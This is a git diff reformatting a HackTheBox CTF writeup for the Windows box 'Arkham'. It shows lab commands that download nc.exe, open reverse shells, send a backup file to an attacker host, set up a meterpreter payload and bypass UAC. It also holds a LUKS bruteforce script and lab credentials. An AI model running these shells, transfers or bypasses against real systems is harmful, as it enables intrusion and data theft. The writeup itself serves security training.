@@ -5,9 +5,12 @@ tags:
   - hackthebox
   - ctf
   - writeup
+showdate: true
+toc: true
 ---
-
+{{%summary%}}
 ![img](/images/arkham-writeup/1.png)
+{{%/summary%}}
 
 Arkham is one of my favorite boxes on HTB, I personally wouldn't have rated it as Medium but maybe it's just because it's the hardest Windows box I have faced so far, and it proved to be a lot of fun and a good way to learn more about Windows internals and post exploitation. Keep in mind that this is going to be a rather long writeup as I like showing all the steps and the thought process behind them. That being said, let's start from the very beginning: enumeration.
 
@@ -17,7 +20,7 @@ Arkham is one of my favorite boxes on HTB, I personally wouldn't have rated it a
 
 The usual basic nmap scan with service enumeration (-sV) and execution of default NSE scripts (-sC) on all ports (-p-) returns a few ports that may be of our interest:
 
-```
+```shell-session
 ┌─[baud@parrot]─[~/arkham]
 └──╼ $sudo nmap -sC -sV -p- -oA nmap 10.10.10.130
 [sudo] password di baud:
@@ -62,7 +65,7 @@ First of all, from the version of IIS running on port 80 (IIS 10.0) we can alrea
 
 Running gobuster with a big dictionary doesn't return any results either so better focus somewhere else.
 
-```
+```shell-session
 ┌─[✗]─[baud@parrot]─[~/arkham]
 └──╼ $gobuster dir -w ../SecLists/Discovery/Web-Content/big.txt -t 50 -u http://10.10.10.130
 ===============================================================
@@ -91,8 +94,9 @@ For example, there's a second web server running on port 8080, this time it's an
 
 The website seems to be advertising a service called "Masks", name which is actually a hint on the technology behind this web application, in fact the only functional button on the website is the "Subscription" button, which redirects to this URL:
 
-
-    http://10.10.10.130:8080/userSubscribe.faces
+```shell-session
+http://10.10.10.130:8080/userSubscribe.faces
+```
 
 The .faces extension tells us this page relies on the Java Server Faces framework (JFS), possibly the Apache MyFaces implementation since this is an Apache server. JFS is a framework used to design web-based user interfaces, and on this site it's used to handle this simple subscription form:
 
@@ -108,7 +112,7 @@ Unfortunately for us, Apache MyFaces enables ViewState encryption by default usi
 
 All gobuster can find on this second web server is a bunch of resource folders that we cannot list:
 
-```
+```shell-session
 /css
 /favicons
 /fonts
@@ -124,7 +128,7 @@ Despite it containing "secrets" the BatShare folder is accessible without authen
 
 ![img](/images/arkham-writeup/7.png)
 
-```
+```shell-session
 smb: \> get appserver.zip
 getting file \appserver.zip of size 4046695 as appserver.zip (1415,4 KiloBytes/sec) (average 1415,4 KiloBytes/sec)
 smb: \> exit
@@ -146,13 +150,15 @@ Archive:  appserver.zip
 
 The IMPORTANT.txt file contains a note for Alfred from Bruce, anticipating us that backup.img is password protected:
 
-
-    Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce
+```shell-session
+Alfred, this is the backup image from our linux server. Please see that The Joker or anyone else doesn't have unauthenticated access to it. - Bruce
+```
 
 Now it's time for some trial and error. The easiest way to go past this obstacle is creating a subset of a big dictionary containing only Batman-related passwords to make our lives easier, I'm going to use rockyou.txt:
 
-
-    $ cat /usr/share/wordlists/rockyou.txt | egrep 'batman|robin|alfred|joker|scarecrow|gotham' > wordlist.txt
+```shell-session
+$ cat /usr/share/wordlists/rockyou.txt | egrep 'batman|robin|alfred|joker|scarecrow|gotham' > wordlist.txt
+```
 
 This command creates a new wordlist with all the entries in rockyou.txt that contain the specified Batman-related words. This returns less than 6000 passwords, much less than having to deal with the whole huge original dictionary:
 
@@ -168,7 +174,7 @@ Because it’s a LUKS file we can use the cryptsetup utility to work with it, an
 
 Thanks to this a simple bash script can be written to bruteforce the file:
 
-```
+```bash
 # read a line from the wordlist
 cat wordlist.txt | while read i; do
 echo -ne "\rTrying: \"$i\""\\r
@@ -185,57 +191,63 @@ if [ $STATUS -eq 0 ]; then
 ```
 
 The script is a little slow but it does the job and the password is found:
-	
-	┌─[root@parrot]─[/home/baud/arkham]
-	└──╼ #./luksBrute.sh backup.img
-	Trying: "batman"
-	Trying: "alfredo"
-	Trying: "alfred"
-	Trying: "robinson"
-	Trying: "batman1"
-	Trying: "joker"
-	Trying: "robin"
-	[....]
-	PASSWORD FOUND: "batmanforever"
-	
+
+```shell-session
+┌─[root@parrot]─[/home/baud/arkham]
+└──╼ #./luksBrute.sh backup.img
+Trying: "batman"
+Trying: "alfredo"
+Trying: "alfred"
+Trying: "robinson"
+Trying: "batman1"
+Trying: "joker"
+Trying: "robin"
+[....]
+PASSWORD FOUND: "batmanforever"
+```
+
 cryptsetup automatically mapped the image file on to /dev/mapper/x so it needs to be mounted:
-	
-	┌─[root@parrot]─[/home/baud/arkham]
-	└──╼ # mkdir /mnt/arkham
-	┌─[root@parrot]─[/home/baud/arkham]
-	└──╼ # mount /dev/mapper/x /mnt/arkham
-	┌─[root@parrot]─[/home/baud/arkham]
-	└──╼ # ls -la /mnt/arkham/
-	totale 14
-	drwxr-xr-x 4 root root  1024 dic 25  2018 .
-	drwxr-xr-x 1 root root    38 ago  7 19:23 ..
-	drwx------ 2 root root 12288 dic 25  2018 lost+found
-	drwxrwxr-x 4 root root  1024 dic 25  2018 Mask
+
+```shell-session
+┌─[root@parrot]─[/home/baud/arkham]
+└──╼ # mkdir /mnt/arkham
+┌─[root@parrot]─[/home/baud/arkham]
+└──╼ # mount /dev/mapper/x /mnt/arkham
+┌─[root@parrot]─[/home/baud/arkham]
+└──╼ # ls -la /mnt/arkham/
+totale 14
+drwxr-xr-x 4 root root  1024 dic 25  2018 .
+drwxr-xr-x 1 root root    38 ago  7 19:23 ..
+drwx------ 2 root root 12288 dic 25  2018 lost+found
+drwxrwxr-x 4 root root  1024 dic 25  2018 Mask
+```
 	
 lost+found is empty but Mask contains MyFaces configuration files, other than a few random images which don't contain anything interesting and have nothing to hide:
-		
-	┌─[root@parrot]─[/mnt/arkham]
-	└──╼ #ls -ls Mask
-	totale 880
-	1 drwxr-xr-x 2 root root   1024 dic 25  2018 docs
-	95 -rw-rw-r-- 1 root root  96978 dic 25  2018 joker.png
-	103 -rw-rw-r-- 1 root root 105374 dic 25  2018 me.jpg
-	672 -rw-rw-r-- 1 root root 687160 dic 25  2018 mycar.jpg
-	8 -rw-rw-r-- 1 root root   7586 dic 25  2018 robin.jpeg
-	1 drwxr-xr-x 2 root root   1024 dic 25  2018 tomcat-stuff
-	┌─[root@parrot]─[/mnt/arkham]
-	└──╼ #ls -la Mask/tomcat-stuff
-	totale 193
-	drwxr-xr-x 2 root root   1024 dic 25  2018 .
-	drwxrwxr-x 4 root root   1024 dic 25  2018 ..
-	-rw-r--r-- 1 root root   1368 dic 25  2018 context.xml
-	-rw-r--r-- 1 root root    832 dic 25  2018 faces-config.xml
-	-rw-r--r-- 1 root root   1172 dic 25  2018 jaspic-providers.xml
-	-rw-r--r-- 1 root root     39 dic 25  2018 MANIFEST.MF
-	-rw-r--r-- 1 root root   7678 dic 25  2018 server.xml
-	-rw-r--r-- 1 root root   2208 dic 25  2018 tomcat-users.xml
-	-rw-r--r-- 1 root root 174021 dic 25  2018 web.xml
-	-rw-r--r-- 1 root root   3498 dic 25  2018 web.xml.bak
+
+```shell-session
+┌─[root@parrot]─[/mnt/arkham]
+└──╼ #ls -ls Mask
+totale 880
+1 drwxr-xr-x 2 root root   1024 dic 25  2018 docs
+95 -rw-rw-r-- 1 root root  96978 dic 25  2018 joker.png
+103 -rw-rw-r-- 1 root root 105374 dic 25  2018 me.jpg
+672 -rw-rw-r-- 1 root root 687160 dic 25  2018 mycar.jpg
+8 -rw-rw-r-- 1 root root   7586 dic 25  2018 robin.jpeg
+1 drwxr-xr-x 2 root root   1024 dic 25  2018 tomcat-stuff
+┌─[root@parrot]─[/mnt/arkham]
+└──╼ #ls -la Mask/tomcat-stuff	
+totale 193
+drwxr-xr-x 2 root root   1024 dic 25  2018 .
+drwxrwxr-x 4 root root   1024 dic 25  2018 ..
+-rw-r--r-- 1 root root   1368 dic 25  2018 context.xml
+-rw-r--r-- 1 root root    832 dic 25  2018 faces-config.xml
+-rw-r--r-- 1 root root   1172 dic 25  2018 jaspic-providers.xml
+-rw-r--r-- 1 root root     39 dic 25  2018 MANIFEST.MF
+-rw-r--r-- 1 root root   7678 dic 25  2018 server.xml
+-rw-r--r-- 1 root root   2208 dic 25  2018 tomcat-users.xml
+-rw-r--r-- 1 root root 174021 dic 25  2018 web.xml
+-rw-r--r-- 1 root root   3498 dic 25  2018 web.xml.bak
+```
 	
 If you're wondering, docs contains the scripts of Batman Begins. Confused? So am I. But here's something very interesting to break the confusion, by taking a look at the configuration files I discover the encryption settings used by the server:
 
@@ -364,14 +376,14 @@ while True:
 
 This script gives us a blind shell on the box, we are able to execute any operation we want but it's still uncomfortable, and blind, so to have a proper shell I downloaded nc.exe on the box using Invoke-WebRequest:
 
-```
+```shell-session
 ┌─[root@parrot]─[/home/baud/server]
 └──╼ # php -S 0.0.0.0:9090 -t .
 ┌─[root@parrot]─[/home/baud/arkham]
 └──╼ # nc -lvnp 9999
 ```
 
-```
+```shell-session
 > powershell iwr http://10.10.14.29:9090/nc.exe -OutFile ./nc.exe
 > nc.exe -e cmd 10.10.14.29 9999
 ```
@@ -388,7 +400,7 @@ With this we finally have a shell as Alfred and can read our first flag, then it
 
 Inside Alfred's downloads directory there's a backups folder containing a backup.zip file, because I'm lazy and meterpreter executables are immediately detected by an angry Defender I'm going to use nc.exe to transfer this file locally:
 
-```
+```shell-session
 # On Arkham:
 nc.exe 10.10.14.29 4444 < c:\users\alfred\downloads\backups\backup.zip
 # On local box:
@@ -410,14 +422,14 @@ Convert the attachment back to .png and the result is this:
 
 Not only this picture gives us the Batman account's password, it also gives us a big hint on one of the two ways we have to get root. So now we have a new pair of credentials:
 
-```
+```shell-session
 User: batman
 Pass: Zx^#QZX+T!123
 ```
 
 There are no services such as RDP or SSH running on the box so we cannot log in as Batman from the outside, but we can do it through a [PSSession](https://www.sconstantinou.com/windows-powershell-sessions-pssessions/):
 
-```
+```powershell
 $pw = ConvertTo-SecureString -string "Zx^#QZX+T!123" -AsPlainText -force;
 $pp = new-object -typename System.Management.Automation.PSCredential -ArgumentList "ARKHAM\batman", $pw;
 Enter-PSSession -ComputerName localhost -Credential $pp
@@ -427,11 +439,15 @@ Enter-PSSession -ComputerName localhost -Credential $pp
 
 Once in the PSSession we must follow the following syntax in order to run cmd commands:
 
-    Invoke-Command -ScriptBlock { command }
+```powershell
+Invoke-Command -ScriptBlock { command }
+```
 
 This is very tedious to write every time so we can bypass this obstacle by using the nc.exe executable we uploaded earlier to start a normal cmd shell on another port:
 
-    Invoke-Command -ScriptBlock {C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9797 -e cmd.exe}
+```powershell
+Invoke-Command -ScriptBlock {C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.29 9797 -e cmd.exe}
+```
 
 ![img](/images/arkham-writeup/19.png)
 
@@ -451,7 +467,9 @@ This is because UAC is enabled and doesn't allow us to use Administrator privile
 
 I said that the attachment picture is a clear hint of a way to grab the root flag because we can use the same utility shown in Alfred's screenshot to access it. Because we are already administrators with this account we can use net use and mount the administrator's folder (or the whole drive) on to another drive and we'll be able to access it without UAC getting in the way:
 
-    $ net use * "\\arkham\users\administrator\desktop" /persistent:no
+```shell-session
+$ net use * "\\arkham\users\administrator\desktop" /persistent:no
+```
 
 ![img](/images/arkham-writeup/22.png)
 
@@ -466,7 +484,7 @@ There are a few currently unpathced UAC bypasses for Windows 10, I tried these t
 
 And I'm going to demonstrate egre55's method because in my opinion it's more fun, even if a little longer. This method abuses the fact that some executables can bypass the UAC prompt thanks to a property found inside the executable's manifest: "<autoElevate>true". This allows certain programs to be granted administrator privileges without a UAC prompt. Egre55 found that some of the programs with this property are vulnerable to DLL hijacking and crafting a malicious DLL allows us to execute arbitrary code bypassing UAC. These are the vulnerable programs:
 
-```
+```shell-session
 C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
 C:\Windows\SysWOW64\SystemPropertiesComputerName.exe
 C:\Windows\SysWOW64\SystemPropertiesHardware.exe
@@ -482,7 +500,7 @@ If we drop a malicious srrstr.dll file in that folder and start one of those pro
 
 These are the steps to generate the payload using GreatSCT:
 
-```
+```shell-session
 > use Bypass
 > use msbuild/meterpreter/rev_tcp.py
 > set LHOST 10.10.14.29
@@ -496,8 +514,9 @@ GreatSCT will create two different files for us:
 
 payload.xml will be msbuild's input, while payload.rc is a Metasploit resource file to be opened by msfconsole either with the -r flag or the resource command, and will start a multi handler for us. So let's download the xml file on Arkham (again with Invoke-WebRequest or "iwk" for short) and then launch msbuild.exe by specifing its absolute path since it's not in %path%:
 
-
-    C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild.xml
+```shell-session
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild.xml
+```
 
 ![img](/images/arkham-writeup/25.png)
 
@@ -555,7 +574,7 @@ void exploit(void)
 
 If you're interested in knowing more about how it works I suggest reading these two pages: [DllMain](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain), [CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa). I compiled it using mingw32:
 
-```
+```shell-session
 ┌─[baud@parrot]─[~/arkham]
 └──╼ $i686-w64-mingw32-gcc -shared -o srrstr.dll srrstr.cpp -l ws2_32
 ```
@@ -570,7 +589,7 @@ Note that the full path of the program must be specified, this is necessary beca
 
 The second UAC bypass is easy to pull off as well, it consinsts in downloading a [C# source file](https://github.com/0xVIC/UAC/blob/master/SendKeys_technique.cs), compiling it as a DLL on Arkham, loading the DLL into memory from PS, and calling the bypass function from the DLL by giving it a command to run which will inherit higher privileges. [Here](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/) is explained the bypass that the DLL exploits, which relies on a binary called CMSTP.exe:
 
-```
+```powershell
 # download the file locally:
 Invoke-WebRequest "http://10.10.14.29:9090/bypass.cs" -outfile "./Source.cs"
 # compile it as a DLL:
